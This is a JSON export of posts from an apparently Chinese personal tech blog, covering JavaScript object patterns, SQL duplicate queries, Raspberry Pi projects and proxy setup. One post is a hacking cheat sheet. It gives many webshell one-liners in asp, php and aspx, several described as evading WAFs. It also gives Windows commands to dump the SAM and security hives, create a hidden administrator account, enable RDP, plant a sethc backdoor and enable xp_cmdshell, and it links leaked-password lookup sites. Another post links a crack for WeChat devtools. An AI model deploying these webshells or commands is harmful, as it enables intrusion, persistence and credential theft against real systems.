//true&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，实例属性都是在构造函数中定义的，而由所有实例共享的属性constructor和方法sayName()则是在原型中定义的。所以修改了person1.friends并不会改变person2.friends，因为他们分别引用了不同的数组。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种构造函数与原型模式混成的模式，是目前在ECMAScript中使用最广泛、认同度最高的一种创建自定义类型的方法。可以说，这是用来定义引用的一种默认形式。五、动态原型模式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有其他OO语言经验的开发人员在看到独立的构造函数和原型时，很可能会感到非常的困惑。动态原型模式就是用来解决这个问题的一个方案，它把所有的信息都封装在了构造函数中，而通过构造函数中初始化原型（仅在必要的情况下），又保持了同时使用构造函数和原型的优点。换句话说，可以通过检查某个应该存在的方法是否有效，来决定是否要初始化原型。来看一个例子：function Person(name, age){&nbsp;&nbsp;&nbsp;&nbsp;this.name = name; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.age = age; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.friends = [“乾隆”,“康熙”]; &nbsp; &nbsp;//注意if语句&nbsp;&nbsp;&nbsp;&nbsp;if(typeof this.sayName!=“function”){&nbsp;&nbsp;&nbsp;&nbsp;Person.prototype.sayName = function(){ &nbsp;&nbsp;&nbsp;&nbsp;alert(this.name); &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}}var person1 = new Person(“wei”,29);person1.friends.push(“嬴政”);person1.sayName();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意构造函数代码中的if语句，这里只在sayName()方法不存在的情况下才会将它添加到原型中。这断代码只有在第一次调用构造函数的时候才会被执行。此后，原型已经被初始化，不需要再做什么修改。不过要记住，这里所做的修改能立即在所有实例中得到反映。因此，这种方法可以说确实非常完美。其中if语句检查的是初始化之后应该存在的任何方法和属性–不必再用一大堆if来检查每个属性和方法，只检查其中一个即可。对于采用这样模式创建的对象，还可以使用instanceof操作符来确定他的类型。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意：使用动态原型模式时，不能使用对象字面量重写原型。如果在已经创建了实例的情况下重写原型，那么就会切断现有的实例与新原型之间的联系。六、寄生构造函数模式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通常，在上述几种模式都不适合的情况下可以使用寄生构造函数模式。这种模式的基本思想是创建一个函数，该函数的作用仅仅是封装创建对象的代码，然后再返回新创建的对象，但从表面看，这个函数又很像典型的构造函数。来看一个例子：function Person(name, age, job){&nbsp; var o = new Object();&nbsp; o.name = name;&nbsp; o.age = age; &nbsp; &nbsp;&nbsp; o.job = job; &nbsp; &nbsp;&nbsp; o.sayName = function(){&nbsp; alert(this.name); &nbsp; &nbsp;} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;return o;}var person = new Person(“wei”,29,“banzhuan”);person.sayName(); &nbsp; //“wei”&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，Person函数创建了一个对象，并以相应的属性和方法初始化该对象，然后返回了这个对象。除了使用new操作符把使用的包装函数叫做构造函数之外，这个模式和工厂模式并没有多大的区别。构造函数在不返回值的情况下，会默认返回新对象的实例。而通过在构造函数的末尾添加一个return语句，可以重写调用构造函数时返回的值。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个模式可以在特殊的情况下来为对象创建构造函数。假设我们想创建一个具有额外方法的特殊数组。由于不能直接修改Array构造函数，因此可以使用这个模式：function SpecialArray(){ &nbsp; &nbsp;//创建数组 &nbsp; &nbsp;var values = new Array(); &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;//添加值 &nbsp; &nbsp;values.push.apply(values,arguments); &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;//添加方法 &nbsp; &nbsp;values.toPipedString = function(){ &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;return this.join(“|”);} &nbsp; &nbsp; &nbsp; &nbsp;//返回数组 &nbsp; &nbsp;return values; }var colors = new SpecialArray(“red”,“blue”,“green”);console.log(colors.toPipedString());//red|blue|green&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，我们创建了一个名为SpecialArray的构造函数。在这个函数的内部，首先创建了一个数组，然后push()方法初始化了数组的值。随后又给数组实例添加了toPipedString()方法，用来返回以竖线分隔的数组值。最后将数组以函数的形式返回。接着，我们调用了SpecialArray构造函数，传入了初始化的值，并调用了toPipedString()方法。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于寄生构造函数模式，有一点需要声明：首先，返回的对象与构造函数或者构造函数的原型没有任何关系；也就是说，构造函数返回的对象与在构造函数外部创建的对象没有什么不同。为此，不能依赖instanceof操作符来确定对象的类型。由于存在这一的问题，我们建议在可以使用其他模式的情况下不要使用这种模式。七、稳妥构造函数模式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;道格拉斯·克拉克福德发明了JavaScript中的稳妥对象这个概念。所谓稳妥对象，是指没有公共属性，而且其方法也不引用this对象。稳妥对象最适合在一些安全环境中（这些环境会禁止使用this和new），或者在防止数据被其他应用程序改动时使用。稳妥构造函数遵循的与寄生构造函数类似的模式，但又两点不同：一是新创建对象的实例方法不引用this；二是不使用new操作符调用构造函数。按照稳妥构造函数的要求，可以将前面的Person构造函数重写如下：function Person(name, age, job){ &nbsp; &nbsp; &nbsp; &nbsp;//创建要返回的新对象&nbsp; &nbsp; &nbsp; &nbsp;var o = new Object(); &nbsp; &nbsp; &nbsp;//可以在这里定义私有变量和函数 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;//添加方法&nbsp; &nbsp;o.sayName = function(){&nbsp;&nbsp; &nbsp; &nbsp;&nbsp;alert(this.name); &nbsp; &nbsp;&nbsp; &nbsp;}; &nbsp; &nbsp; &nbsp; &nbsp;//返回对象&nbsp; &nbsp;return o; &nbsp; &nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意，在以这种模式创建的对象中，除了使用sayName()方法之外，没有其他办法访问name的值。可以像下面使用稳妥的Person构造函数：var person =Person(“weiqi”,22,“banzhuan”);person.sayName(); &nbsp; //weiqi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样，变量person中保存的是一个稳妥对象，而除了sayName()方法外，没有别的方式可以访问其他数据成员。即使有其他代码会给这个对象添加方法或数据成员，但也不可能有别的办法访问传入到构造函数中的原始数据。稳妥构造函数模式提供的这种安全性，使得他非常适合在某些安全执行环境–例如，ADsafe(www.adsafe.org)提供的环境下使用。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意：与寄生构造函数模式类似，使用稳妥构造函数模式创建的对象与构造函数之间没有什么关系，因此instanceof操作符对这种对象也没有意义。 转自：http://blog.csdn.net/u014346301/article/details/52204967","categories":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/categories/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/tags/Web/"}],"keywords":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/categories/Web/"}]},{"title":"Mac Wi-Fi掉线解决方案","slug":"Mac-Wi-Fi-掉线解决方案-1","date":"2016-10-09T07:07:52.000Z","updated":"2017-10-26T12:59:55.519Z","comments":true,"path":"2016/10/09/Mac-Wi-Fi-掉线解决方案-1/","link":"","permalink":"http://www.yfgeek.com/2016/10/09/Mac-Wi-Fi-掉线解决方案-1/","excerpt":"","text":"最近连接学校的WiFi老掉线，经过清空WiFi默认配置后，成功。 分享解决方案： 进入目录/Library/Preferences/SystemConfiguration 删除 12345com.apple.airport.preferences.plistcom.apple.network.identification.plistcom.apple.wifi.message-tracer.plistNetworkInterfaces.plistpreferences.plist 重启 解决问题。 转载自：http://blog.chenxiaosheng.com/posts/2014-11-17/mac_osx_yosemite_fix_wifi_problems.html","categories":[{"name":"Mac","slug":"Mac","permalink":"http://www.yfgeek.com/categories/Mac/"}],"tags":[{"name":"Mac","slug":"Mac","permalink":"http://www.yfgeek.com/tags/Mac/"}],"keywords":[{"name":"Mac","slug":"Mac","permalink":"http://www.yfgeek.com/categories/Mac/"}]},{"title":"SQL重复记录查询（转载）","slug":"SQL重复记录查询（转载）","date":"2016-10-05T11:34:04.000Z","updated":"2017-10-26T12:59:55.521Z","comments":true,"path":"2016/10/05/SQL重复记录查询（转载）/","link":"","permalink":"http://www.yfgeek.com/2016/10/05/SQL重复记录查询（转载）/","excerpt":"","text":"&nbsp;1、查找表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断select&nbsp;&nbsp;from&nbsp;peoplewhere&nbsp;peopleId&nbsp;in&nbsp;(select&nbsp;&nbsp;peopleId&nbsp;&nbsp;from&nbsp;&nbsp;people&nbsp;&nbsp;group&nbsp;&nbsp;by&nbsp;&nbsp;peopleId&nbsp;&nbsp;having&nbsp;&nbsp;count(peopleId)&nbsp;&gt;&nbsp;1)&nbsp;例二：&nbsp;select from testtable&nbsp;where numeber in (select number from people group by number having count(number) &gt; 1 )&nbsp;可以查出testtable表中number相同的记录2、删除表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断，只留有rowid最小的记录delete&nbsp;from&nbsp;people&nbsp;where&nbsp;peopleId&nbsp;&nbsp;in&nbsp;(select&nbsp;&nbsp;peopleId&nbsp;&nbsp;from&nbsp;people&nbsp;&nbsp;group&nbsp;&nbsp;by&nbsp;&nbsp;peopleId&nbsp;&nbsp;&nbsp;having&nbsp;&nbsp;count(peopleId)&nbsp;&gt;&nbsp;1)and&nbsp;rowid&nbsp;not&nbsp;in&nbsp;(select&nbsp;min(rowid)&nbsp;from&nbsp;&nbsp;people&nbsp;&nbsp;group&nbsp;by&nbsp;peopleId&nbsp;&nbsp;having&nbsp;count(peopleId&nbsp;)&gt;1)3、查找表中多余的重复记录（多个字段）&nbsp;select&nbsp;&nbsp;from&nbsp;vitae&nbsp;awhere&nbsp;(a.peopleId,a.seq)&nbsp;in&nbsp;&nbsp;(select&nbsp;peopleId,seq&nbsp;from&nbsp;vitae&nbsp;group&nbsp;by&nbsp;peopleId,seq&nbsp;&nbsp;having&nbsp;count()&nbsp;&gt;&nbsp;1)4、删除表中多余的重复记录（多个字段），只留有rowid最小的记录delete&nbsp;from&nbsp;vitae&nbsp;awhere&nbsp;(a.peopleId,a.seq)&nbsp;in&nbsp;&nbsp;(select&nbsp;peopleId,seq&nbsp;from&nbsp;vitae&nbsp;group&nbsp;by&nbsp;peopleId,seq&nbsp;having&nbsp;count()&nbsp;&gt;&nbsp;1)and&nbsp;rowid&nbsp;not&nbsp;in&nbsp;(select&nbsp;min(rowid)&nbsp;from&nbsp;vitae&nbsp;group&nbsp;by&nbsp;peopleId,seq&nbsp;having&nbsp;count()&gt;1)5、查找表中多余的重复记录（多个字段），不包含rowid最小的记录select&nbsp;&nbsp;from&nbsp;vitae&nbsp;awhere&nbsp;(a.peopleId,a.seq)&nbsp;in&nbsp;&nbsp;(select&nbsp;peopleId,seq&nbsp;from&nbsp;vitae&nbsp;group&nbsp;by&nbsp;peopleId,seq&nbsp;having&nbsp;count()&nbsp;&gt;&nbsp;1)and&nbsp;rowid&nbsp;not&nbsp;in&nbsp;(select&nbsp;min(rowid)&nbsp;from&nbsp;vitae&nbsp;group&nbsp;by&nbsp;peopleId,seq&nbsp;having&nbsp;count()&gt;1)(二)比方说在A表中存在一个字段“name”，而且不同记录之间的“name”值有可能会相同，现在就是需要查询出在该表中的各记录之间，“name”值存在重复的项；Select&nbsp;Name,Count()&nbsp;From&nbsp;A&nbsp;Group&nbsp;By&nbsp;Name&nbsp;Having&nbsp;Count()&nbsp;&gt;&nbsp;1如果还查性别也相同大则如下:Select&nbsp;Name,sex,Count()&nbsp;From&nbsp;A&nbsp;Group&nbsp;By&nbsp;Name,sex&nbsp;Having&nbsp;Count()&nbsp;&gt;&nbsp;1(三)方法一declare&nbsp;@max&nbsp;integer,@id&nbsp;integerdeclare&nbsp;cur_rows&nbsp;cursor&nbsp;local&nbsp;for&nbsp;select&nbsp;主字段,count()&nbsp;from&nbsp;表名&nbsp;group&nbsp;by&nbsp;主字段&nbsp;having&nbsp;count()&nbsp;&gt;；&nbsp;1open&nbsp;cur_rowsfetch&nbsp;cur_rows&nbsp;into&nbsp;@id,@maxwhile&nbsp;@@fetch_status=0beginselect&nbsp;@max&nbsp;=&nbsp;@max&nbsp;-1set&nbsp;rowcount&nbsp;@maxdelete&nbsp;from&nbsp;表名&nbsp;where&nbsp;主字段&nbsp;=&nbsp;@idfetch&nbsp;cur_rows&nbsp;into&nbsp;@id,@maxendclose&nbsp;cur_rowsset&nbsp;rowcount&nbsp;0方法二 有两个意义上的重复记录，一是完全重复的记录，也即所有字段均重复的记录，二是部分关键字段重复的记录，比如Name字段重复，而其他字段不一定重复或都重复可以忽略。1、对于第一种重复，比较容易解决，使用select&nbsp;distinct&nbsp;&nbsp;from&nbsp;tableName就可以得到无重复记录的结果集。如果该表需要删除重复的记录（重复记录保留1条），可以按以下方法删除select&nbsp;distinct&nbsp;&nbsp;into&nbsp;#Tmp&nbsp;from&nbsp;tableNamedrop&nbsp;table&nbsp;tableNameselect&nbsp;&nbsp;into&nbsp;tableName&nbsp;from&nbsp;#Tmpdrop&nbsp;table&nbsp;#Tmp发生这种重复的原因是表设计不周产生的，增加唯一索引列即可解决。2、这类重复问题通常要求保留重复记录中的第一条记录，操作方法如下假设有重复的字段为Name,Address，要求得到这两个字段唯一的结果集select&nbsp;identity(int,1,1)&nbsp;as&nbsp;autoID,&nbsp;&nbsp;into&nbsp;#Tmp&nbsp;from&nbsp;tableNameselect&nbsp;min(autoID)&nbsp;as&nbsp;autoID&nbsp;into&nbsp;#Tmp2&nbsp;from&nbsp;#Tmp&nbsp;group&nbsp;by&nbsp;Name,autoIDselect&nbsp;&nbsp;from&nbsp;#Tmp&nbsp;where&nbsp;autoID&nbsp;in(select&nbsp;autoID&nbsp;from&nbsp;#tmp2)最后一个select即得到了Name，Address不重复的结果集（但多了一个autoID字段，实际写时可以写在select子句中省去此列）(四)查询重复select&nbsp;*&nbsp;from&nbsp;tablename&nbsp;where&nbsp;id&nbsp;in&nbsp;(select&nbsp;id&nbsp;from&nbsp;tablename&nbsp;group&nbsp;by&nbsp;id&nbsp;having&nbsp;count(id)&nbsp;&gt;&nbsp;1)","categories":[{"name":"Sql","slug":"Sql","permalink":"http://www.yfgeek.com/categories/Sql/"}],"tags":[{"name":"Sql","slug":"Sql","permalink":"http://www.yfgeek.com/tags/Sql/"}],"keywords":[{"name":"Sql","slug":"Sql","permalink":"http://www.yfgeek.com/categories/Sql/"}]},{"title":"使用ProxyChains进行终端代理","slug":"使用ProxyChains进行终端代理","date":"2016-09-25T16:46:04.000Z","updated":"2017-10-26T12:59:55.523Z","comments":true,"path":"2016/09/26/使用ProxyChains进行终端代理/","link":"","permalink":"http://www.yfgeek.com/2016/09/26/使用ProxyChains进行终端代理/","excerpt":"","text":"安装1brew install proxychains-ng 配置1vi /usr/local/etc/proxychains.conf 使用1proxychains4 ssh xx:xx@xx.com","categories":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/categories/Hack/"}],"tags":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/tags/Hack/"}],"keywords":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/categories/Hack/"}]},{"title":"微信小程序的一些感想","slug":"微信小程序的一些感想","date":"2016-09-25T10:50:00.000Z","updated":"2017-10-26T12:59:55.525Z","comments":true,"path":"2016/09/25/微信小程序的一些感想/","link":"","permalink":"http://www.yfgeek.com/2016/09/25/微信小程序的一些感想/","excerpt":"前言这几天简直火爆了所有的社区的微信小程序，现在有时间可以试一试了。","text":"前言这几天简直火爆了所有的社区的微信小程序，现在有时间可以试一试了。 下载微信小程序目前正处于内测阶段，所以我这个算是尝鲜，用的破解版。Mac版下载地址：http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100.dmg windows下载地址：http://source.lattecake.com/files/2016/09/wechat_web_devtools_0.9.092100_x64.exe 破解如果你不是内测用户，你需要破解，先下载以下文件。 文件1： http://source.lattecake.com/files/2016/09/createstep.js 文件2： http://source.lattecake.com/files/2016/09/projectStores.js 替换路径： createstep.js -&gt; /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/components/create/createstep.js projectStores.js -&gt; /Applications/wechatwebdevtools.app/Contents/Resources/app.nw/app/dist/stroes/projectStores.js 尝鲜 做了一次简单的尝鲜，写了一个hellowolrd，微信小程序是由几个最基础的文件构成的： app.js app.wxss app.json app.wxml 其中wxss文件类似于css，所有css语法均支持js是APP()json文件是层级设置，页面的形态wxml文件更像是xml和html的混合版 IDE并不强大，但是是用HTML写的，有点类似于VS CODE。 优点 HTML5是未来，腾讯帮助整个生态系统往前走了一大步。 腾讯有巨大用户群的优势，使得部分程序，尤其是企业程序的开发成本大幅度降低，跨平台变得更加简单通用。 有统一开发的IDE，包括IDE也是一个HTML5程序，这就是未来。 开发简单，入门门槛低。 缺点 不支持引用js，比如jquery等众多优秀的js插件。 可移植性差，如果以后还有XX app想做个小程序功能，你需要跳出这个体系，重新做，这是巨大的成本。我想这也就是腾讯想把你牢牢地拴在他所创建的体系下的方式。 随时有被App Store封掉的风险，苹果不允许程序里嵌套程序，我觉得小程序做不长久，可以参考当年下架Adode的flash文件直接转换的ipa文件事件。 没有react native好，这是两个完全不同的概念，腾讯创建出的小程序似乎更像是js+html+css，react才是未来。 总结我想用一句名言总结一下前端趋势及未来App趋势： Any application that can be written in JavaScript, will eventually be written in JavaScript. 腾讯的想法是非常好的，让JavaScript去干一切事情，这就是未来。Java喊了好几年了一次编译到处运行，全世界没有程序员不知道，但实际呢？JavaScript似乎是真正把这件事情做成了，JavaScript作为网站的前端默默地发展了几十年，现在趋势越来越明显，随着浏览器内核的运行效率的大幅度提升，这些看似不不现实的趋势越来越明显，那就是网页程序。 不过受限于App store不知道能否有较大的发展，开发者看似十分火爆的东西，真正在用户层次上能否一样的火爆，不得人知，让时间去检验一切吧。","categories":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/categories/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/tags/Web/"}],"keywords":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/categories/Web/"}]},{"title":"树莓派搭建ss服务器","slug":"ss-server","date":"2016-09-13T15:38:35.000Z","updated":"2017-10-26T12:59:55.526Z","comments":true,"path":"2016/09/13/ss-server/","link":"","permalink":"http://www.yfgeek.com/2016/09/13/ss-server/","excerpt":"","text":"简介树莓派打算长期放在家里了，为了方便我身居海外还能方便的听上网易云音乐，顺利的看上国内的优酷爱奇艺，打算在树莓派上搭ss服务器 为什么不用pptp vpn这是个好问题，实际上我已经搭建了pptp vpn，只是连不上，大概是因为国内运营商中国电信做了端口屏蔽限制，目前发现已经屏蔽的端口有80和PPTP的端口。 一键配置脚本1234wget http://mirrors.linuxeye.com/oneinstack.tar.gztar xzf oneinstack.tar.gzcd oneinstack./shadowsocks.sh install 漫长的等待结束就好了 慢慢配置安装Pip1apt-get install python-pip python-gevent python-m2crypto 安装Shadowsocks1pip install shadowsocks 创建Shadowsocks配置文件配置文件 /etc/shadowsocks.json 内容如下：1234567891011&#123; &quot;server&quot;:&quot;0.0.0.0&quot;, &quot;server_port&quot;:8388, &quot;local_address&quot;: &quot;127.0.0.1&quot;, &quot;local_port&quot;:1080, &quot;password&quot;:&quot;密码&quot;, &quot;timeout&quot;:300, &quot;method&quot;:&quot;aes-256-cfb&quot;, &quot;fast_open&quot;: false, &quot;workers&quot;: 1&#125; 启动服务1nohup ssserver -c /etc/shadowsocks.json &amp; 设定为自动启动的方法写入 nohup ssserver -c /etc/shadowsocks.json &amp; 到 /etc/rc.local 文件的 exit 之前。","categories":[{"name":"Linux","slug":"Linux","permalink":"http://www.yfgeek.com/categories/Linux/"}],"tags":[{"name":"Raspberry","slug":"Raspberry","permalink":"http://www.yfgeek.com/tags/Raspberry/"}],"keywords":[{"name":"Linux","slug":"Linux","permalink":"http://www.yfgeek.com/categories/Linux/"}]},{"title":"GHOST搬迁到HEXO(Github Pages)指南","slug":"GHOST搬迁到HEXO-Github-Pages-指南","date":"2016-09-12T13:41:59.000Z","updated":"2017-10-26T12:59:55.517Z","comments":true,"path":"2016/09/12/GHOST搬迁到HEXO-Github-Pages-指南/","link":"","permalink":"http://www.yfgeek.com/2016/09/12/GHOST搬迁到HEXO-Github-Pages-指南/","excerpt":"","text":"前言想了很长时间，权衡了一下利弊，还是觉得Github Pages平台会好一些，虽然可能我用了几天就会被和谐掉。 但是GHOST还需要找专门能够运行Node的平台，在这方面，全静态的HEXO绝对是博客的首选。 前提在搬家之前，首先你要有一个Github，或者Gitlab，本文不过多叙述： 安装HEXO 配置Github 搬家第一步Ghost导出数据json：实验室-导出，下载好json 第二步安装搬家工具1npm i hexo-migrator-ghost --save 第三步修改./scaffolds/post.md文件内容为： 1234title: &#123;&#123; title &#125;&#125; date: &#123;&#123; date &#125;&#125; tags: &#123;&#123; tags &#125;&#125; --- 第四步将json文件放到根目录，并且执行： 12hexo migrate ghost source.json hexo clean ; hexo d -g 注意经过以上步骤，基本上是搬家完毕了，但是仍有一些需要注意的： HEXO的Markdown语法比较严谨，所以倒入进来会存在问题，需要进一步修正，比如#如果前面不空格是不解析标题的 tag可能会出问题，会自动加–，请自行删除，或者批量删除","categories":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/categories/Web/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/tags/Web/"}],"keywords":[{"name":"Web","slug":"Web","permalink":"http://www.yfgeek.com/categories/Web/"}]},{"title":"那些Hack神器及奇技淫巧","slug":"hacktool","date":"2016-09-11T15:07:28.000Z","updated":"2017-10-26T12:59:55.527Z","comments":true,"path":"2016/09/11/hacktool/","link":"","permalink":"http://www.yfgeek.com/2016/09/11/hacktool/","excerpt":"","text":"简介这里会总结一些Hack经验，都是我日常使用的，会长期更新，渗透测试专用，请勿挪作非法用途。 那些网站社工库国内http://www.findmima.com/ http://www.wghostk.com/so/ http://p.08lt.com http://www.144118.com/ 国际https://haveibeenpwned.com/ https://leakbase.pw/ C段http://www.144118.com/ whois查询http://whois.domaintools.com/ 历史页面那些实用命令reg导出samreg save hklm\\sam sam.hive reg save hklm\\system system.hive reg save hklm\\security security.hive Windows新建用户net user admin$ admin /add net localgroup administrators admin$ /add net user Guest 1234 net user Guest /active:yes net localgroup administrators Guest /add 打开3389(2003,xp)REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f sethc后门Copy C:\\windows\\explorer.exe C:\\Windows\\System32\\sethc.exe /y mssql xpcmdshell报错EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE; 那些一句话asp一句话木马1&lt;%eval request(&quot;x&quot;)%&gt; php一句话木马1&lt;?php eval($_POST[g]);?&gt; aspx一句话1&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;x&quot;],&quot;unsafe&quot;);%&gt; 数据库加密一句话(密码a)1┼攠數畣整爠煥敵瑳∨≡┩愾 网站配置、版权信息专用一句话1&quot;%&gt;&lt;%Eval Request(x)%&gt; 一句话再过护卫神1&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%execute(Y)%&gt; 过拦截一句话木马1&lt;% eXEcGlOBaL ReQuEsT(&quot;x&quot;) %&gt; asp闭合型一句话1%&gt;&lt;%eval request(&quot;0o1Znz1ow&quot;)%&gt;&lt;% 能过安全狗的解析格式1;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg 突破安全狗的一句话1&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%eval(Y)%&gt; elong过安全狗的php一句话1&lt;?php $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;; $a($_POST[cc]); ?&gt; 后台常用写入php一句话（密码x）12345&lt;? $fp = @fopen(&quot;c.php&quot;, &apos;a&apos;); @fwrite($fp, &apos;&lt;&apos;.&apos;?php&apos;.&quot;\\r\\n\\r\\n&quot;.&apos;eval($_POST[x])&apos;.&quot;\\r\\n\\r\\n?&quot;.&quot;&gt;\\r\\n&quot;); @fclose($fp); ?&gt; 高强度php一句话1&lt;?php substr(md5($_REQUEST[&apos;heroes&apos;]),28)==&apos;acd0&apos;&amp;&amp;eval($_REQUEST[&apos;c&apos;]);?&gt; 新型变异PHP一句话(密码b4dboy)1($b4dboy = $_POST[&apos;b4dboy&apos;]) &amp;&amp; @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’); 突破安全狗的aspx一句话12&lt;%@ Page Language=&quot;C#&quot; ValidateRequest=&quot;false&quot; %&gt;&lt;%try&#123; System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[&quot;你的密码&quot;].Value))).CreateInstance(&quot;c&quot;, true, System.Reflection.BindingFlags.Default, null, new object[] &#123; this &#125;, null, null); &#125; catch &#123; &#125;%&gt; 突破护卫神，保护盾一句话12&lt;?php $a = str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);$a($_POST[&quot;test&quot;]); ?&gt; PHP高强度一句话：1&lt;?php substr(md5($_REQUEST[&apos;x&apos;]),28)==&apos;acd0&apos;&amp;&amp;eval($_REQUEST[&apos;c&apos;]);?&gt; 菜刀连接：/x.php?x=lostwolf 脚本类型：php 密码：c1&lt;?php assert($_REQUEST[&quot;c&quot;]);?&gt; aspx过狗1&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%var name:String=Request.Item[&quot;cmd&quot;];Response.Write(eval(name,&quot;unsafe&quot;));%&gt; 那些神器 Sqlmap","categories":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/categories/Hack/"}],"tags":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/tags/Hack/"}],"keywords":[{"name":"Hack","slug":"Hack","permalink":"http://www.yfgeek.com/categories/Hack/"}]},{"title":"树莓派实时温度湿度监测进阶","slug":"runtimelcd","date":"2016-08-26T07:19:14.000Z","updated":"2017-10-26T12:59:55.526Z","comments":true,"path":"2016/08/26/runtimelcd/","link":"","permalink":"http://www.yfgeek.com/2016/08/26/runtimelcd/","excerpt":"","text":"这是一个树莓派实时监测的项目，需要参考上文，可在web上显示实时的温度及湿度变化情况。 依赖 Adafruit_DHT Adafruit_CharLCD Nginx/Apache (请自行提前安装) 安装依赖123456789sudo apt-get updatesudo apt-get install build-essential python-dev python-smbus python-pipgit clone https://github.com/adafruit/Adafruit_Python_DHT.gitcd Adafruit_Python_DHTsudo python setup.py installsudo pip install RPi.GPIOgit clone https://github.com/adafruit/Adafruit_Python_CharLCDcd Adafruit_Python_CharLCDsudo python setup.py install 安装12cd /var/www/htmlgit clone https://github.com/yfgeek/rpi-TempRuntime.git 运行12cd /var/www/html/rpi-TempRuntimepython LCD.py 截图","categories":[],"tags":[{"name":"Raspberry","slug":"Raspberry","permalink":"http://www.yfgeek.com/tags/Raspberry/"}],"keywords":[]},{"title":"把KALI放到U盘里","slug":"ba-kalifang-dao-upan-li","date":"2016-08-25T11:26:45.000Z","updated":"2016-08-25T11:29:38.000Z","comments":true,"path":"2016/08/25/ba-kalifang-dao-upan-li/","link":"","permalink":"http://www.yfgeek.com/2016/08/25/ba-kalifang-dao-upan-li/","excerpt":"步骤1：进入 bios设置U盘启动，保存并启动电脑 步骤2：在启动选择画面中，选第一个“kali linux(686-pae)”。","text":"步骤1：进入 bios设置U盘启动，保存并启动电脑 步骤2：在启动选择画面中，选第一个“kali linux(686-pae)”。步骤3：进入kali桌面后 打开命令行，输入gparted，在弹出的窗口程序的右上角选择对应你U盘容量的磁盘。把第二个分区unmount后，将此区格式化成 ext4文件系统，同时把分区名(Label)改成 persistence ，同时记下分区列表里面第二个分区的分区名 例如我的是 /dev/sdb2。 关掉gparted ，在命令行里输入以下命令： 1234mkdir /mnt/usbmount /dev/sdb2 /mnt/usbecho \"/ union\" &gt;&gt; /mnt/usb/persistence.confumount /mnt/usb","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.yfgeek.com/tags/Linux/"}],"keywords":[]},{"title":"基于树莓派的实时温度湿度监测平台","slug":"rpi-tmp-hdt-platform","date":"2016-08-25T05:39:08.000Z","updated":"2016-08-25T11:28:59.000Z","comments":true,"path":"2016/08/25/rpi-tmp-hdt-platform/","link":"","permalink":"http://www.yfgeek.com/2016/08/25/rpi-tmp-hdt-platform/","excerpt":"前言很早就入了树莓派，一直没有折腾GPIO功能，虽然我是学自动化的，但是我对引脚之类的一窍不通，做这个也是为了预习一下本专业的知识，而更多的，是乐趣。 